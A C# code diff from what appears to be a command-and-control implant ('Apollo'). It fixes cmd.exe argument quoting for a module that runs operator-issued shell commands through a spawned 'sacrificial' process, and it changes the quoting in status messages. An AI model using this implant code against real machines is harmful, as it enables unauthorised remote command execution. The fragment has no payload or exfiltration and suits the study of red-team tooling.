@@ -47,7 +47,10 @@ namespace Apollo.CommandModules
             if (job.Task.command == "shell")
             {
                 applicationName = "cmd.exe";
-                commandLine += String.Format("/c \"{0}\"", split[0]);
+                if (split[0].Contains(" "))
+                    commandLine += String.Format("/S /c \"\"{0}\"", split[0]);
+                else
+                    commandLine += String.Format("/S /c \"{0}", split[0]);
             } else
             {
                 applicationName = split[0];
@@ -83,7 +86,7 @@ namespace Apollo.CommandModules
                 }
                 if (commandLine != "")
                 {
-                    commandLine += String.Format(" {0}", subsequentArgs);
+                    commandLine += String.Format(" {0}\"", subsequentArgs);
                 }
                 else
                 {
@@ -124,10 +127,10 @@ namespace Apollo.CommandModules
             {
                 if (sacrificialProcess != null)
                 {
-                    job.SetError(String.Format("Error in executing \"{0}\" (PID: {1}). Reason: {2}", cmdString, sacrificialProcess.PID, ex.Message));
+                    job.SetError(String.Format("Error in executing '{0}' (PID: {1}). Reason: {2}", cmdString, sacrificialProcess.PID, ex.Message));
                 } else
                 {
-                    job.SetError(String.Format("Error in executing \"{0}\". Reason: {1}", cmdString, ex.Message));
+                    job.SetError(String.Format("Error in executing '{0}'. Reason: {1}", cmdString, ex.Message));
                 }
             }
 
@@ -135,7 +138,7 @@ namespace Apollo.CommandModules
             {
                 if (sacrificialProcess.ExitCode == 0 && sacrificialProcess.PID != 0)
                 {
-                    job.SetComplete(String.Format("\nProcess executed \"{0}\" with PID {1} and returned exit code {2}", cmdString, sacrificialProcess.PID, sacrificialProcess.ExitCode));
+                    job.SetComplete(String.Format("\nProcess executed '{0}' with PID {1} and returned exit code {2}", cmdString, sacrificialProcess.PID, sacrificialProcess.ExitCode));
                 } else
                 {
                     job.SetError($"Unknown error. Exit code: {sacrificialProcess.ExitCode} from PID: {sacrificialProcess.PID}");
